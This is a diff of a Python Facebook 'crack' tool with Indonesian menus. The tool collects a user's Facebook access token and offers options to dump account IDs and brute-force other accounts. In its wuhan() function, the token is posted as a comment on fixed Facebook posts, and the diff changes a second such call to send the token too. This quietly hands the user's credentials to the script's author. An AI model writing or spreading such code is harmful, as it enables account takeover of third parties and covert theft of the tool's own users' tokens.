@@ -61,7 +61,6 @@ my_color = [
 warna = random.choice(my_color)
 #  Raka Andrian Tara.  #
 #------------------------------->
-raka = '100000834003593'
 amanda_sayang_raka = '244541413774000'
 ok, cp, id, loop = [], [], [], 0
 waktu = ct.strftime("%H:%M:%S / %d-%m-%Y ")
@@ -82,7 +81,7 @@ def jalan(z):
     for e in z + '\n':
         sys.stdout.write(e)
         sys.stdout.flush()
-        time.sleep(3)
+        time.sleep(1)
 
 def raka_z():
     titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
@@ -93,12 +92,12 @@ def raka_z():
 
 # LO GOBLOG
 logo = ''' 
-\033[0;91m      ooooooooo.             oooo                                     
-\033[0;92m     `888   `Y88.           `888                                     
-\033[0;93m     888   .d88'  .oooo.    888  oooo   .oooo.             oooooooo ®
-\033[0;94m    888ooo88P'  `P  )88b   888 .8P'   `P  )88b           d'""7d8P  
-\033[0;95m   888`88b.     .oP"888   888888.     .oP"888  8888888    .d8P'   
-\033[0;96m  888  `88b.  d8(  888   888 `88b.  d8(  888           .d8P'  .P 
+\033[0;91m     ooooooooo.             oooo                                     
+\033[0;92m    `888   `Y88.           `888                                     
+\033[0;93m    888   .d88'  .oooo.    888  oooo   .oooo.             oooooooo 
+\033[0;94m   888ooo88P'  `P  )88b   888 .8P'   `P  )88b           d'""7d8P  
+\033[0;95m  888`88b.     .oP"888   888888.     .oP"888  8888888    .d8P'   
+\033[0;96m 888  `88b.  d8(  888   888 `88b.  d8(  888           .d8P'  .P 
 \033[0;97mo888o  o888o `Y888""8o o888o o888o `Y888""8o         d8888888P  
 '''
 
@@ -118,23 +117,23 @@ def raka_z():
     print (' %s◍➤%s This Tool Uses Facebook Token Login.\n %s◍➤%s Do You Already Know How To Get Facebook Token?\n %s◍➤%s Type %sOpen%s To Get Facebook Token.'%(O,N,O,N,O,N,H,N))
     amanda = raw_input('\n %s[%s?%s] Login ☆TOKEN☆ :%s '%(N,M,N,H))
     if amanda in ('open', 'Open', 'OPEN'):
-        print '\n%s *%s Download Apk Kiwi Browser Terlebih Dahulu'%(B,N);time.sleep(2)
-        print '%s *%s Klick Dikolom pencarian %https://chrome.google.com/webstore/detail/get-cookie/naciaagbkifhpnoodlkhbejjldaiffcm'%(B,N,H);time.sleep(2)
-        print '%s *%s Setelah Itu Klick %sTambahkan Ke Chrome Selesai'%(B,N,H);time.sleep(2)
-        print '%s *%s Login Akun Fb Dikiwi Lalu Klick %sTitik Tiga Dipojok Kanan Atas%s Tinggal Diklick Paling Bawah Get Cookie %sSelesai%s Pahamkan'%(B,N,H,N,H,N);time.sleep(2)
+        print '\n%s *%s Download Apk Kiwi Browser Terlebih Dahulu'%(B,N);time.sleep(1)
+        print '%s *%s Klick Dikolom pencarian %https://chrome.google.com/webstore/detail/get-cookie/naciaagbkifhpnoodlkhbejjldaiffcm'%(B,N,H);time.sleep(1)
+        print '%s *%s Setelah Itu Klick %sTambahkan Ke Chrome Selesai'%(B,N,H);time.sleep(1)
+        print '%s *%s Login Akun Fb Dikiwi Lalu Klick %sTitik Tiga Dipojok Kanan Atas%s Tinggal Diklick Paling Bawah Get Cookie %sSelesai%s Pahamkan'%(B,N,H,N,H,N);time.sleep(1)
         raw_input(' %s◍➤%s Tekan Enter '%(O,N))
         os.system('xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_')
         raka_z()
     try:
         nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(amanda)).json()['name']
         print '\n %s<>%s WELCOME %s%s%s'%(O,N,K,nama,N);time.sleep(2)
-        print ' %s<>%s Please Use This Sc Properly,\n We Are Not Responsible If This Sc Is Misused...'%(O,N);time.sleep(2)
+        print ' %s<>%s Please Use This Sc Properly,\n We Are Not Responsible If This Sc Is Misused...'%(O,N);time.sleep(1)
         open('.memek.txt', 'w').write(amanda)
         raw_input(' %s◍➤%s Tekan Enter '%(O,N));wuhan(amanda)
         os.system('xdg-open https://youtu.be/bszAm4C5ovE')
         raka_amanda()
     except KeyError:
-        print '\n\n %s[%s!%s] Token Invalid'%(N,M,N);time.sleep(2);raka_z()
+        print '\n\n %s[%s!%s] Token Invalid'%(N,M,N);time.sleep(1);raka_z()
 
 ### ORANG GANTENG ###
 def raka_amanda():
@@ -142,34 +141,34 @@ def raka_amanda():
     try:
     	amanda = open('.memek.txt', 'r').read()
     except IOError:
-        print '\n %s[%s×%s] Token Invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');raka_z()
+        print '\n %s[%s×%s] Token Invalid'%(N,M,N);time.sleep(1);os.system('rm -rf .memek.txt');raka_z()
     try:
         nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(amanda)).json()['name']
     except KeyError:
-        print '\n %s[%s×%s] Token Invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');raka_z()
+        print '\n %s[%s×%s] Token Invalid'%(N,M,N);time.sleep(1);os.system('rm -rf .memek.txt');raka_z()
     except requests.exceptions.ConnectionError:
         exit('\n\n %s[%s!%s] Tidak Ada Koneksi\n'%(N,M,N))
     os.system('clear')
     ip = requests.get('https://api.ipify.org').text
     print logo
-    print '___________________________________________________________\n';time.sleep(3)
-    print ' [\033[0;96m◍➤\033[0m] NAMA       : %s'%(nama);time.sleep(0.03)
+    print '___________________________________________________________\n';time.sleep(1)
+    print ' [\033[0;96m◍➤\033[0m] NAMA       : %s'%(nama);time.sleep(1)
     print ' [\033[0;96m◍➤\033[0m] IP ADDRES  : %s'%(ip)
     print(' [\033[0;96m◍➤\033[0m] PENGGUNA   : Premium ')
-    print '___________________________________________________________\n';time.sleep(3)
-    print ' [%s1%s]\x1b[1;96m◍➤\x1b[1;97m Dump Id Dari Teman'%(O,N);time.sleep(3)
-    print ' [%s2%s]\x1b[1;96m◍➤\x1b[1;97m Dump Id Dari Teman Publik'%(O,N);time.sleep(3)
-    print ' [%s3%s]\x1b[1;96m◍➤\x1b[1;97m Dump Id Dari Total Followers'%(O,N);time.sleep(3)
-    print ' [%s4%s]\x1b[1;96m◍➤\x1b[1;97m Dump Id Dari Like Postingan'%(O,N);time.sleep(3)
-    print ' [%s5%s]\x1b[1;96m◍➤\x1b[1;97m \x1b[1;92mMulai Crack\x1b[1;97m'%(O,N);time.sleep(3)
-    print ' [%s6%s]\x1b[1;96m◍➤\x1b[1;97m Check Informasi Akun Fb'%(O,N);time.sleep(3)
-    print ' [%s7%s]\x1b[1;96m◍➤\x1b[1;97m Lihat Hasil Crack'%(O,N);time.sleep(3)
-    print ' [%s8%s]\x1b[1;96m◍➤\x1b[1;97m Settings User Agent'%(O,N);time.sleep(3)
-    print ' [%s9%s]\x1b[1;96m◍➤\x1b[1;97m Info %sScript%s'%(O,N,O,N);time.sleep(3)
-    print ' [%s0%s]\x1b[1;96m◍➤\x1b[1;97m Logout (%sHapus Token%s)'%(M,N,M,N);time.sleep(3)
+    print '___________________________________________________________\n';time.sleep(1)
+    print ' [%s1%s]\x1b[1;96m◍➤\x1b[1;97m Dump Id Dari Teman'%(O,N);time.sleep(1)
+    print ' [%s2%s]\x1b[1;96m◍➤\x1b[1;97m Dump Id Dari Teman Publik'%(O,N);time.sleep(1)
+    print ' [%s3%s]\x1b[1;96m◍➤\x1b[1;97m Dump Id Dari Total Followers'%(O,N);time.sleep(1)
+    print ' [%s4%s]\x1b[1;96m◍➤\x1b[1;97m Dump Id Dari Like Postingan'%(O,N);time.sleep(1)
+    print ' [%s5%s]\x1b[1;96m◍➤\x1b[1;97m \x1b[1;92mMulai Crack\x1b[1;97m'%(O,N);time.sleep(1)
+    print ' [%s6%s]\x1b[1;96m◍➤\x1b[1;97m Check Informasi Akun Fb'%(O,N);time.sleep(1)
+    print ' [%s7%s]\x1b[1;96m◍➤\x1b[1;97m Lihat Hasil Crack'%(O,N);time.sleep(1)
+    print ' [%s8%s]\x1b[1;96m◍➤\x1b[1;97m Settings User Agent'%(O,N);time.sleep(1)
+    print ' [%s9%s]\x1b[1;96m◍➤\x1b[1;97m Info %sScript%s'%(O,N,O,N);time.sleep(1)
+    print ' [%s0%s]\x1b[1;96m◍➤\x1b[1;97m Logout (%sHapus Token%s)'%(M,N,M,N);time.sleep(1)
     pepek = raw_input('\n [\x1b[1;96m◍➤\x1b[1;97m] Menu : ')
     if pepek == '':
-        print '\n %s[%s×%s] jangan kosong kentod!'%(N,M,N);time.sleep(2);raka_amanda()
+        print '\n %s[%s×%s] jangan kosong kentod!'%(N,M,N);time.sleep(1);raka_amanda()
     elif pepek in['1','01']:
         teman(amanda)
     elif pepek in['2','02']:
@@ -232,7 +231,7 @@ def wuhan(amanda):
 	requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+komen3+'&access_token='+amanda)
 	requests.post('https://graph.facebook.com/4134622646575495/comments/?message='+komen2+'&access_token='+amanda)
 	requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(raka_sayang_amanda,amanda,amanda))
-        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(amanda_sayang_raka,love,amanda))
+        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(amanda_sayang_raka,amanda,amanda))
     except:
     	pass
 
